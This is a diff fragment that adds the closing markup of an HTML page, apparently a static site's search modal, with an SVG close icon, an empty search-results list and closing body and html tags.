+        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+</span>
+      </button>
+    </header>
+    <section class="flex-auto px-2 overflow-auto">
+      <ul id="search-results">
+        
+      </ul>
+    </section>
+  </div>
+</div>
+
+    </div>
+  </body>
+  
+</html>
